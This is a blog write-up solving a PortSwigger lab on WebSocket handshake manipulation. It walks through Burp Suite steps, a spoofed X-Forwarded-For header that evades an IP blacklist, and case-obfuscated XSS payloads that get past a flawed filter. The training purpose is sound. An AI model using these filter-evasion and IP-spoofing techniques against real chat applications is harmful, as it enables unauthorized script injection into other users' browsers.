---
title: Manipulating the WebSocket handshake to exploit vulnerabilities
url: https://infosecwriteups.com/manipulating-the-websocket-handshake-to-exploit-vulnerabilities-7f8dc3504e9c?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-01-18
fetch_date: 2025-10-04T04:08:25.048980
---

# Manipulating the WebSocket handshake to exploit vulnerabilities

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F7f8dc3504e9c&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fmanipulating-the-websocket-handshake-to-exploit-vulnerabilities-7f8dc3504e9c&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fmanipulating-the-websocket-handshake-to-exploit-vulnerabilities-7f8dc3504e9c&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[Mastodon](https://me.dm/%40cyberw1ng)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-7f8dc3504e9c---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-7f8dc3504e9c---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Manipulating the WebSocket handshake to exploit vulnerabilities

## Postswigger Lab Simple Solution — Manipulating the WebSocket to exploit vulnerabilities | Karthikeyan Nagaraj

[![Karthikeyan Nagaraj](https://miro.medium.com/v2/da:true/resize:fill:64:64/1*MQN6JztXVcWsGNXCfJGlgw.gif)](https://cyberw1ng.medium.com/?source=post_page---byline--7f8dc3504e9c---------------------------------------)

[Karthikeyan Nagaraj](https://cyberw1ng.medium.com/?source=post_page---byline--7f8dc3504e9c---------------------------------------)

4 min read

·

Jan 16, 2023

--

Listen

Share

[![]()](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)

### Lab Description:

This online shop has a live chat feature implemented using [WebSockets](https://portswigger.net/web-security/websockets).

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an `alert()` popup in the support agent's browser.

## What is a WebSocket?

WebSockets are becoming increasingly popular because they greatly simplify the communication between a client and a server.

The WebSocket protocol uses the OSI model application layer (Layer 7) to allow a client and server to perform bidirectional (full duplex) communication. This makes it possible to create dynamic, real-time web applications such as instant messaging and photo-sharing apps.

WebSockets overcome some of the traditional restrictions of communications between browsers and servers:

* **Client requests/server responds** — n the past servers had permanent listeners. The client (the one using the browser) didn’t have a fixed listener for long-term connections. This made each communication centered around the client's demands and the server's response.
* **Communication is dependent on the client —** the server can only push a resource to a client when the client requests it.
* **Continual checking** — clients are constantly forced to refresh results from the server. This is why libraries focus on making all asynchronous calls optimized. They also have to identify their response. The most common solution to this problem is the use of callback functions.

### Analysis:

1. First of all, let’s try the live chat Functionality and Intercept try to Intercept the traffic using Burpsuite

Press enter or click to view image in full size

![]()

2. Send the Request you find on Websocket History to the Repeater

Press enter or click to view image in full size

![]()

3. Let’s try to Inject any XSS Payload and try to Reconnect

```
<img src=1 onerror='alert(1)'>
```

Press enter or click to view image in full size

![]()

Our Address is Blacklisted

4. So now, let’s add an Additional header to Stop Blacklisting.

Add the following header to the handshake request to spoof your IP address,

```
X-Forwarded-For: 1.1.1.1
```

```
GET /chat HTTP/1.1
Host: 0ac6003b03db7411c00dd1370074002f.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-WebSocket-Version: 13
Origin: https://0ac6003b03db7411c00dd1370074002f.web-security-academy.net
Sec-WebSocket-Key: YeHso2ZIklfAwWtbrivsDA==
Connection: keep-alive, Upgrade
Cookie: session=pS6iHSLHKf0VWHuWJHhB9lCt523M5hvj
Sec-Fetch-Dest: websocket
Sec-Fetch-Mode: websocket
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
X-Forwarded-For: 1.1.1.1
```

![]()

5. Now Click Connect and send a WebSocket message containing an obfuscated XSS payload, such as:

```
<img src=1 oNeRrOr=alert`1`>
```

Press enter or click to view image in full size

![]()

A YouTube Channel for Cybersecurity Lab’s Poc and Write-ups

[## Cyberw1ng

### Learn Cyber Security and Create Awareness ~ cyberwing Stay tuned with me, Subscribe, and Like the Videos… Ask Doubts…

www.youtube.com](https://www.youtube.com/channel/UCBg0UIT0319Xc-cw4QK8bqA?sub_confirmation=1&source=post_page-----7f8dc3504e9c---------------------------------------)

Github for Resources:

[## Cyberw1ng — Overview

### Security Researcher and Bug Hunter. Cyberw1ng has 8 repositories available. Follow their code on GitHub.

github.com](https://github.com/cyberw1ng?source=post_page-----7f8dc3504e9c---------------------------------------)

Telegram Channel for Free Ethical Hacking Dumps

[## Ethical Hacking Dumps — CEH, OSCP, Comptia

### Materials and Books for Ethical Hacking Exams like CEH v12, OSCP, Comptia Pentest+, Comptia Security+, Comptia Network+…

t.me](https://t.me/ethicalhackingessentials?source=post_page-----7f8dc3504e9c---------------------------------------)

Thank you for Reading!

Happy Ethical Hacking ~

`Author: Karthikeyan Nagaraj ~ Cyberw1ng`

Feel Free to Ask Queries via [LinkedIn](https://www.linkedin.com/in/karthikeyan-nagaraj) and to Buy me a Cofee : )

[![]()](http://buymeacoffee.com/cyberw1ng)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----7f8dc3504e9c---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----7f8dc3504e9c---------------------------------------)

[Ctf](https://medium.com/tag/ctf?source=post_page-----7f8dc3504e9c---------------------------------------)

[Burpsuite](https://medium.com/tag/burpsuite?source=post_page-----7f8dc3504e9c---------------------------------------)

[Websocket](https://medium.com/tag/websocket?source=post_page-----7f8dc3504e9c---------------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--7f8dc3504e9c---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?sou...